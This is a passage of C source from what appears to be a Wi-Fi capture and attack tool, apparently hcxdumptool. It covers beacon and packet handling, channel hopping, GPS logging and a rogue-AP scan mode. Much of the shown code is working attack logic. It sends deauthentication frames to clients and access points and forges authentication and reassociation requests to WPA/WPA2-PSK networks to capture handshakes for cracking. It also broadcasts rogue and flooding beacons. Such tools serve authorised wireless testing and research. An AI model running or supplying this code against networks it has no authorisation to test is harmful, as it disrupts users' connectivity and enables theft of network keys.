	snprintf(servermsg, SERVERMSG_MAX, "%s %3d              %02x%02x%02x%02x%02x%02x [PWNAGOTCHI ID:%.*s]\n", timestring, channelscanlist[cpa],
			macfrx->addr2[0], macfrx->addr2[1], macfrx->addr2[2], macfrx->addr2[3], macfrx->addr2[4], macfrx->addr2[5], 64, zeiger->id);
	if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
	else printf("%s", servermsg);
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
qsort(pagidlist, PAGIDLIST_MAX, PAGIDLIST_SIZE, sort_pagidlist_by_time);
return;
}
/*===========================================================================*/
static inline bool processpag(int vendorlen, uint8_t *ieptr)
{
static int c, p;
static const uint8_t mac_pwag[6] =
{
0xde, 0xad, 0xbe, 0xef, 0xde, 0xad
};

if(ieptr[1] != 0xff) return false;
if(vendorlen <= 0x78) return false;
if(memcmp(&mac_pwag, macfrx->addr2, 6) != 0) return false;
for(p = 2; p < vendorlen -75 ; p++)
	{
	if(memcmp(&ieptr[p], "identity", 8) == 0)
		{
		for(c = 0; c < 64; c++)
			{
			if(!isxdigit(ieptr[p +11 +c])) return false;
			}
		processpagid(ieptr +p +11);
		return true;
		}
	}
return false;
}
/*===========================================================================*/
static inline void process80211beacon()
{
static int apinfolen;
static uint8_t *apinfoptr;
static macessidlist_t *zeiger;
static tags_t tags;

if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
if(apinfoptr[0] == TAG_PAG)
	{
	if(processpag(apinfolen, apinfoptr) == true) return;
	}
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count +=1;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if((zeiger->count %600) == 0)
		{
		gettags(apinfolen, apinfoptr, &tags);
		if((tags.essidlen == 0) || (tags.essid[0] == 0))
			{
			if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
			return;
			}
		zeiger->timestamp = timestamp;
		memcpy(zeiger->ap, macfrx->addr2, 6);
		if(tags.channel != 0) zeiger->channel = tags.channel;
		else zeiger->channel = channelscanlist[cpa];
		zeiger->kdversion = tags.kdversion;
		zeiger->groupcipher = tags.groupcipher;
		zeiger->cipher = tags.cipher;
		zeiger->akm = tags.akm;
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		}
	if((infinityflag == true)&& ((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS))
		{
		if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256))
			{
			if(((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) || ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE)) send_authentication_req_opensystem(macfrx->addr2);
			}
		if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(zeiger);
		else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(zeiger);
		if(memcmp(&mac_null, zeiger->client, 6) != 0) send_deauthentication2client(zeiger->client, zeiger->ap, reasoncode);
		send_deauthentication2client(macfrx->addr1, macfrx->addr2, reasoncode);
		}
	if((channelscanlist[cpa] == zeiger->channel) && (zeiger->status < AP_M2M3) && (zeiger->count <= attackstopcount))
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
			{
			if((zeiger->count %attackcount) == staytime)
				{
				if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256))
					{
					if(((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) || ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE)) send_authentication_req_opensystem(macfrx->addr2);
					}
				}
			if(((zeiger->count %attackcount) == staytime *2) && (memcmp(&mac_null, zeiger->client, 6) != 0))
				{
				if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(zeiger);
				else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(zeiger);
				}
			}
		if((attackstatus &DISABLE_DEAUTHENTICATION) != DISABLE_DEAUTHENTICATION)
			{
			if(((zeiger->count %attackcount) == staytime *3) && (memcmp(&mac_null, zeiger->client, 6) != 0))
				{
				send_deauthentication2client(zeiger->client, zeiger->ap, reasoncode);
				}
			if((zeiger->count %attackcount) == staytime *4) 
				{
				send_deauthentication2client(macfrx->addr1, macfrx->addr2, reasoncode);
				}
			}
		}
	if(zeiger->count >= attackresumecount) zeiger->count = 0;
	if((zeiger->status &AP_BEACON) != AP_BEACON)
		{
		zeiger->status |= AP_BEACON;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		if((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) printstatusap(macfrx->addr1, zeiger, "BEACON");
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
gettags(apinfolen, apinfoptr, &tags);
zeiger->timestamp = timestamp;
zeiger->status = AP_BEACON;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(tags.channel != 0) zeiger->channel = tags.channel;
else zeiger->channel = channelscanlist[cpa];
zeiger->kdversion = tags.kdversion;
zeiger->groupcipher = tags.groupcipher;
zeiger->cipher = tags.cipher;
zeiger->akm = tags.akm;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
if(channelscanlist[cpa] == zeiger->channel)
	{
	if((tags.essidlen != 0) && (tags.essid[0] != 0))
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
			{
			if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256))
				{
				if(((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) || ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE)) send_authentication_req_opensystem(macfrx->addr2);
				}
			if((attackstatus &DISABLE_DEAUTHENTICATION) != DISABLE_DEAUTHENTICATION) send_deauthentication2client(macfrx->addr1, macfrx->addr2, reasoncode);
			}
		}
	else
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		}
	}
if((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) printstatusap(macfrx->addr1, zeiger, "BEACON");
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void get_channel()
{
static struct iwreq pwrq;
static char timestring[16];

memset(&pwrq, 0, sizeof(pwrq));
strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ -1);
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.e = 0;
if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) return;
if(aktchannel != pwrq.u.freq.m)
	{
	errorcount++;
	strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
	snprintf(servermsg, SERVERMSG_MAX, "%s     ERROR: %d [INTERFACE IS NOT ON EXPECTED CHANNEL]\n", timestring, errorcount);
	if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
	else printf("%s", servermsg);
	}
return;
}
/*===========================================================================*/
static inline bool set_channel()
{
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ -1);
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = channelscanlist[cpa];
pwrq.u.freq.e = 0;
if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) return false;
if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) == 0) aktchannel = pwrq.u.freq.m;
return true;
}
/*===========================================================================*/
static inline void process_gps()
{
static char *nmeaptr;
static const char *gpgga = "$GPGGA";
static const char *gprmc = "$GPRMC";

nmeatemplen = recvfrom(fd_gps, nmeatempsentence, NMEA_MAX -1, 0, NULL, NULL);
if(nmeatemplen < 44) return;
nmeatempsentence[nmeatemplen] = 0;
nmeaptr = strstr(nmeatempsentence, gpgga);
if(nmeaptr == NULL) nmeaptr = strstr(nmeatempsentence, gprmc);
if(nmeaptr == NULL) return;
nmealen = 0;
while((nmeaptr[nmealen] != 0x0) && ( nmeaptr[nmealen] != 0x0a) && ( nmeaptr[nmealen] != 0xd)) nmealen++;
nmeaptr[nmealen] = 0;
memcpy(&nmeasentence,  nmeaptr, nmealen +1);
if(fd_pcapng > 0) writecbnmea(fd_pcapng);
if(fh_nmea != NULL) fprintf(fh_nmea, "%s\n", nmeasentence);
gpscount++;
return;
}
/*===========================================================================*/
static inline void process_packet()
{
static uint32_t rthl;

packetlen = recvfrom(fd_socket, epb +EPB_SIZE, PCAPNG_MAXSNAPLEN, 0, NULL, NULL);
gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000) + tv.tv_usec;
if(packetlen == 0)
	{
	fprintf(stderr, "\ninterface went down\n");
	globalclose();
	}
if(packetlen < 0)
	{
	perror("\nfailed to read packet");
	errorcount++;
	return;
	}
#ifdef DEBUG
debugprint(packetlen, &epb[EPB_SIZE]);
#endif
if(packetlen < (int)RTH_SIZE)
	{
	fprintf(stderr, "\ngot damged radiotap header\n");
	errorcount++;
	return;
	}
incomingcount++;
packetptr = &epb[EPB_SIZE];
rth = (rth_t*)packetptr;
if(rth->it_version != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_pad != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_present == 0)
	{
	errorcount++;
	return;
	}
rthl = le16toh(rth->it_len);
if(rthl <= HDRRT_SIZE) return; /* outgoing packet */
ieee82011ptr = packetptr +rthl;
ieee82011len = packetlen -rthl;
if(((le32toh(rth->it_present) &0x80000003) == 0x80000003) && ((packetptr[0x18] &0x10) == 0x10)) ieee82011len -= 4; /* Atheros FCS quick and dirty */
if(ieee82011len < MAC_SIZE_ACK) return;
macfrx = (mac_t*)ieee82011ptr;
if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
	{
	payloadptr = ieee82011ptr +MAC_SIZE_LONG;
	payloadlen = ieee82011len -MAC_SIZE_LONG;
	}
else
	{
	payloadptr = ieee82011ptr +MAC_SIZE_NORM;
	payloadlen = ieee82011len -MAC_SIZE_NORM;
	}
if(macfrx->type == IEEE80211_FTYPE_MGMT)
	{
	if(macfrx->subtype == IEEE80211_STYPE_BEACON)
		{
		process80211beacon();
		if(beaconfloodflag == true) send_beacon_active();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_REQ)
		{
		if(memcmp(&mac_broadcast, macfrx->addr1, 6) == 0) process80211probe_req();
		else if(memcmp(&mac_myaphidden, macfrx->addr1, 6) == 0) return;
		else if(memcmp(&mac_null, macfrx->addr1, 6) == 0) process80211probe_req();
		else process80211probe_req_directed();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211probe_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_AUTH)
		{
		if(memcmp(macfrx->addr1, macfrx->addr3, 6) == 0) process80211authentication_req();
		else if(memcmp(macfrx->addr2, macfrx->addr3, 6) == 0) process80211authentication_resp();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_REQ) process80211association_req();
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_RESP) process80211association_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_REQ) process80211reassociation_req();
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_RESP) process80211reassociation_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_ACTION) process80211action();
	}
else if(macfrx->type == IEEE80211_FTYPE_CTL)
	{
	if(macfrx->subtype == IEEE80211_STYPE_ACK) process80211ack();
	else if(macfrx->subtype == IEEE80211_STYPE_RTS) process80211rts();
	else if(macfrx->subtype == IEEE80211_STYPE_PSPOLL) process80211powersave_poll();
	else if(macfrx->subtype == IEEE80211_STYPE_BACK) process80211blockack();
	else if(macfrx->subtype == IEEE80211_STYPE_BACK_REQ) process80211blockack_req();
	}
else if(macfrx->type == IEEE80211_FTYPE_DATA)
	{
	if((macfrx->subtype &IEEE80211_STYPE_NULLFUNC) == IEEE80211_STYPE_NULLFUNC)
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) process80211null();
		}
	else if((macfrx->subtype &IEEE80211_STYPE_QOS_NULLFUNC) == IEEE80211_STYPE_QOS_NULLFUNC)
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) process80211qosnull();
		return;
		}
	qosflag = false;
	if((macfrx->subtype &IEEE80211_STYPE_QOS_DATA) == IEEE80211_STYPE_QOS_DATA)
		{
		qosflag = true;
		payloadptr += QOS_SIZE;
		payloadlen -= QOS_SIZE;
		}
	if(payloadlen < LLC_SIZE) return;
	llcptr = payloadptr;
	llc = (llc_t*)llcptr;
	if(((ntohs(llc->type)) == LLC_TYPE_AUTH) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		process80211eap();
		}
	else if(((ntohs(llc->type)) == LLC_TYPE_IPV4) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		if((pcapngframesout &PCAPNG_FRAME_IPV4) == PCAPNG_FRAME_IPV4)
			{
			if(fd_pcapng <= 0) return;
			if((pcapngframesout &PCAPNG_FRAME_IPV4) != PCAPNG_FRAME_IPV4) return;
			writeepb(fd_pcapng);
			}
		}
	else if(((ntohs(llc->type)) == LLC_TYPE_IPV6) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		if((pcapngframesout &PCAPNG_FRAME_IPV6) == PCAPNG_FRAME_IPV6)
			{
			if(fd_pcapng <= 0) return;
			if((pcapngframesout &PCAPNG_FRAME_IPV6) != PCAPNG_FRAME_IPV6) return;
			writeepb(fd_pcapng);
			}
		}
	else if(macfrx->prot ==1)
		{
		mpduptr = payloadptr;
		mpdu = (mpdu_t*)mpduptr;
		if(((mpdu->keyid >> 5) &1) == 1) process80211data_wpa();
		else if(((mpdu->keyid >> 5) &1) == 0) process80211data_wep();
		}
	}
return;
}
/*===========================================================================*/
static inline void process_fd()
{
static uint64_t incomingcountold;
static int sd;
static int fdnum;
static fd_set readfds;
static struct timeval tvfd;
static const char *fimtempl;
static const char *fimtemplprotect = "protect";
static const char *fimtemplattack = "attack";
static const char *fimtemplunused = "unused";

fimtempl = fimtemplunused;
if(filtermode == 1) fimtempl = fimtemplprotect;
if(filtermode == 2) fimtempl = fimtemplattack;
snprintf(servermsg, SERVERMSG_MAX, "\e[?25l\nstart capturing (stop with ctrl+c)\n"
	"NMEA 0183 SENTENCE........: %s\n"
	"INTERFACE NAME............: %s\n"
	"INTERFACE HARDWARE MAC....: %02x%02x%02x%02x%02x%02x\n"
	"DRIVER....................: %s\n"
	"DRIVER VERSION............: %s\n"
	"DRIVER FIRMWARE VERSION...: %s\n"
	"ERRORMAX..................: %d errors\n"
	"BPF code blocks...........: %" PRIu16 "\n"
	"FILTERLIST ACCESS POINT...: %d entries\n"
	"FILTERLIST CLIENT.........: %d entries\n"
	"FILTERMODE................: %s\n"
	"WEAK CANDIDATE............: %s\n"
	"ESSID list................: %d entries\n"
	"ROGUE (ACCESS POINT)......: %02x%02x%02x%02x%02x%02x (BROADCAST HIDDEN)\n"
	"ROGUE (ACCESS POINT)......: %02x%02x%02x%02x%02x%02x (BROADCAST OPEN)\n"
	"ROGUE (ACCESS POINT)......: %02x%02x%02x%02x%02x%02x (incremented on every new client)\n"
	"ROGUE (CLIENT)............: %02x%02x%02x%02x%02x%02x\n"
	"EAPOLTIMEOUT..............: %" PRIu64 " usec\n"
	"REPLAYCOUNT...............: %" PRIu64 "\n"
	"ANONCE....................: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n"
	"SNONCE....................: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n"
	"\n",
	nmeasentence, interfacename, mac_orig[0], mac_orig[1], mac_orig[2], mac_orig[3], mac_orig[4], mac_orig[5],
	drivername, driverversion, driverfwversion,
	maxerrorcount, bpf.len, filteraplistentries, filterclientlistentries, fimtempl, weakcandidate,
	beaconextlistlen,
	mac_myaphidden[0], mac_myaphidden[1], mac_myaphidden[2], mac_myaphidden[3], mac_myaphidden[4], mac_myaphidden[5],
	mac_myapopen[0], mac_myapopen[1], mac_myapopen[2], mac_myapopen[3], mac_myapopen[4], mac_myapopen[5],
	mac_myap[0], mac_myap[1], mac_myap[2], mac_myap[3], mac_myap[4], mac_myap[5],
	mac_myclient[0], mac_myclient[1], mac_myclient[2], mac_myclient[3], mac_myclient[4], mac_myclient[5],
	eapoltimeoutvalue, myrc,
	myanonce[0], myanonce[1], myanonce[2], myanonce[3], myanonce[4], myanonce[5], myanonce[6], myanonce[7],
	myanonce[8], myanonce[9], myanonce[10], myanonce[11], myanonce[12], myanonce[13], myanonce[14], myanonce[15],
	myanonce[16], myanonce[17], myanonce[18], myanonce[19], myanonce[20], myanonce[21], myanonce[22], myanonce[23],
	myanonce[24], myanonce[25], myanonce[26], myanonce[27], myanonce[28], myanonce[29], myanonce[30], myanonce[31],
	mysnonce[0], mysnonce[1], mysnonce[2], mysnonce[3], mysnonce[4], mysnonce[5], mysnonce[6], mysnonce[7],
	mysnonce[8], mysnonce[9], mysnonce[10], mysnonce[11], mysnonce[12], mysnonce[13], mysnonce[14], mysnonce[15],
	mysnonce[16], mysnonce[17], mysnonce[18], mysnonce[19], mysnonce[20], mysnonce[21], mysnonce[22], mysnonce[23],
	mysnonce[24], mysnonce[25], mysnonce[26], mysnonce[27], mysnonce[28], mysnonce[29], mysnonce[30], mysnonce[31]);

if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
incomingcountold = 0;
gettimeofday(&tv, NULL);
tvfd.tv_sec = 0;
tvfd.tv_usec = FDUSECTIMER;
cpa = 0;
if(set_channel() == false) errorcount++;
if(beaconactiveflag == true)
	{
	send_beacon_open();
	send_beacon_hidden();
	}
if(rgbeaconlist->timestamp != 0) send_beacon_list_active();
while(1)
	{
	gettimeofday(&tv, NULL);
	if(tv.tv_sec != tvold.tv_sec)
		{
		get_channel();
		tvold.tv_sec = tv.tv_sec;
		if(tv.tv_sec >= tvtot.tv_sec)
			{
			totflag = true;
			globalclose();
			}
		if((tv.tv_sec %5) == 0)
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				if(incomingcountold == incomingcount)
					{
					nanosleep(&sleepled, NULL);
					GPIO_SET = 1 << gpiostatusled;
					nanosleep(&sleepled, NULL);
					GPIO_CLR = 1 << gpiostatusled;
					}
				}
			incomingcountold = incomingcount;
			}
		if((tv.tv_sec %staytime) == 0)
			{
			cpa++;
			if(channelscanlist[cpa] == 0) cpa = 0;
			if(set_channel() == false)
				{
				errorcount++;
				continue;
				}
			if(beaconactiveflag == true)
				{
				send_beacon_active();
				send_beacon_open();
				send_beacon_hidden();
				}
			if(rgbeaconlist->timestamp != 0) send_beacon_list_active();
			}
		if((tv.tv_sec %60) == 0)
			{
			if(((statusout &STATUS_GPS) == STATUS_GPS) && (fd_gps > 0)) printposition();
			if((statusout &STATUS_INTERNAL) == STATUS_INTERNAL) printtimestatus();
			}
		}
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	if(wantstopflag == true) globalclose();
	if(errorcount >= maxerrorcount)
		{
		fprintf(stderr, "\nmaximum number of errors is reached\n");
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	sd = fd_socket;
	if(fd_gps > 0)
		{
		FD_SET(fd_gps, &readfds);
		sd = fd_gps;
		}
	fdnum = select(sd +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds)) process_gps();
	else if(FD_ISSET(fd_socket, &readfds)) process_packet();
	else
		{
		get_channel();
		if(beaconactiveflag == true) send_beacon_active();
		if(rgbeaconlist->timestamp != 0) send_beacon_list_active();
		tvfd.tv_sec = 0;
		tvfd.tv_usec = FDUSECTIMER;
		}
	}
return;
}
/*===========================================================================*/
static inline void printrcascan()
{
static scanlist_t *zeiger;
static char timestring[16];

qsort(scanlist, SCANLIST_MAX, SCANLIST_SIZE, sort_scanlist_by_count);
strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
printf("\033[2J\033[0;0H BSSID         CH COUNT   HIT ESSID                 [%s]\n"
	"---------------------------------------------------------------\n",
	timestring);
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX; zeiger++)
	{
	if(zeiger->count == 0) return;
	printf(" %02x%02x%02x%02x%02x%02x %3d %5d %5d %s\n",
		zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
		zeiger->channel, zeiger->count, zeiger->counthit, zeiger->essid);
	}
return;
}
/*===========================================================================*/
static inline void process80211probe_resp_rca_scan()
{
static int apinfolen;
static uint8_t *apinfoptr;
static scanlist_t *zeiger;
static tags_t tags;

if(targetscanflag == true)
	{
	if(memcmp(&lastap, macfrx->addr2, 6) != 0) return;
	}
if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX -1; zeiger++)
	{
	if(zeiger->count == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	gettags(apinfolen, apinfoptr, &tags);
	if(tags.channel != 0) zeiger->channel = tags.channel;
	else zeiger->channel = channelscanlist[cpa];
	zeiger->timestamp = timestamp;
	zeiger->count +=1;
	zeiger->essidlen = tags.essidlen;
	memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
	if(memcmp(macfrx->addr1, &mac_myclient, 6) == 0) zeiger->counthit += 1;
	return;
	}
memset(zeiger, 0, SCANLIST_SIZE);
gettags(apinfolen, apinfoptr, &tags);
if(tags.channel != 0) zeiger->channel = tags.channel;
else zeiger->channel = channelscanlist[cpa];
if((sl == 1) && (zeiger->channel) > 14)
	{
	zeiger->channel = 0;
	return;
	}
if((sl == 2) && (zeiger->channel) <= 14)
	{
	zeiger->channel = 0;
	return;
	}
zeiger->timestamp = timestamp;
zeiger->count = 1;
memcpy(zeiger->ap, macfrx->addr2, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
if(memcmp(macfrx->addr1, &mac_myclient, 6) == 0) zeiger->counthit += 1;
qsort(scanlist, zeiger -scanlist, SCANLIST_SIZE, sort_scanlist_by_count);
return;
}
/*===========================================================================*/
static inline void process80211beacon_rca_scan()
{
static int apinfolen;
static uint8_t *apinfoptr;
static scanlist_t *zeiger;
static tags_t tags;

if(targetscanflag == true)
	{
	if(memcmp(&lastap, macfrx->addr2, 6) != 0) return;
	}
if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX -1; zeiger++)
	{
	if(zeiger->count == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	gettags(apinfolen, apinfoptr, &tags);
	if(tags.channel != 0) zeiger->channel = tags.channel;
	else zeiger->channel = channelscanlist[cpa];
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
		{
		if((zeiger->count %10) == 0) send_proberequest_directed(macfrx->addr2, zeiger->essidlen, zeiger->essid);
		}
	return;
	}
memset(zeiger, 0, SCANLIST_SIZE);
gettags(apinfolen, apinfoptr, &tags);
if(tags.channel != 0) zeiger->channel = tags.channel;
else zeiger->channel = channelscanlist[cpa];
if((sl == 1) && (zeiger->channel) > 14)
	{
	zeiger->channel = 0;
	return;
	}
if((sl == 2) && (zeiger->channel) <= 14)
	{
	zeiger->channel = 0;
	return;
	}
zeiger->timestamp = timestamp;
zeiger->count = 1;
memcpy(zeiger->ap, macfrx->addr2, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_directed(macfrx->addr2, zeiger->essidlen, zeiger->essid);
qsort(scanlist, zeiger -scanlist, SCANLIST_SIZE, sort_scanlist_by_count);
return;
}
/*===========================================================================*/
static inline void process_packet_rca()
{
static uint32_t rthl;

packetlen = read(fd_socket, epb +EPB_SIZE, PCAPNG_MAXSNAPLEN);
if(packetlen == 0)
	{
	fprintf(stderr, "\ninterface went down\n");
	globalclose();
	}
if(packetlen < 0)
	{
	perror("\nfailed to read packet");
	errorcount++;
	return;
	}
#ifdef DEBUG
debugprint(packetlen, &epb[EPB_SIZE]);
#endif
if(packetlen < (int)RTH_SIZE)
	{
	fprintf(stderr, "\ngot damged radiotap header\n");
	errorcount++;
	return;
	}
if(ioctl(fd_socket, SIOCGSTAMP, &tv) < 0)
	{
	perror("\nfailed to get time stamp");
	errorcount++;
	return;
	}
timestamp = ((uint64_t)tv.tv_sec *1000000) + tv.tv_usec;
incomingcount++;
packetptr = &epb[EPB_SIZE];
rth = (rth_t*)packetptr;
if(rth->it_version != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_pad != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_present == 0)
	{
	errorcount++;
	return;
	}
rthl = le16toh(rth->it_len);
if(rthl <= 14) return; /* outgoing packet */
ieee82011ptr = packetptr +rthl;
ieee82011len = packetlen -rthl;
if(((le32toh(rth->it_present) &0x80000003) == 0x80000003) && ((packetptr[0x18] &0x10) == 0x10)) ieee82011len -= 4; /* Atheros FCS quick and dirty */
if(ieee82011len < MAC_SIZE_ACK) return;
macfrx = (mac_t*)ieee82011ptr;
if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
	{
	payloadptr = ieee82011ptr +MAC_SIZE_LONG;
	payloadlen = ieee82011len -MAC_SIZE_LONG;
	}
else
	{
	payloadptr = ieee82011ptr +MAC_SIZE_NORM;
	payloadlen = ieee82011len -MAC_SIZE_NORM;
	}
if(macfrx->type == IEEE80211_FTYPE_MGMT)
	{
	if(macfrx->subtype == IEEE80211_STYPE_BEACON) process80211beacon_rca_scan();
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211probe_resp_rca_scan();
	}
if(fd_pcapng > 0) writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process_fd_rca()
{
static uint64_t incomingcountold;
static int sd;
static int fdnum;
static fd_set readfds;
static struct timeval tvfd;

gettimeofday(&tv, NULL);
tvold.tv_sec = tv.tv_sec;
tvold.tv_usec = tv.tv_usec;
tvfd.tv_sec = 0;
tvfd.tv_usec = FDUSECTIMER;
cpa = 0;
if(set_channel() == false) errorcount++;
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
printrcascan();
while(1)
	{
	gettimeofday(&tv, NULL);
	if(tv.tv_sec != tvold.tv_sec)
		{
		get_channel();
		cpa++;
		if(channelscanlist[cpa] == 0) cpa = 0;
		if(set_channel() == false)
			{
			errorcount++;
			continue;
			}
		tvold.tv_sec = tv.tv_sec;
		if(tv.tv_sec >= tvtot.tv_sec)
			{
			totflag = true;
			globalclose();
			}
		if((tv.tv_sec %5) == 0)
			{
			if(gpiostatusled > 0)
				{
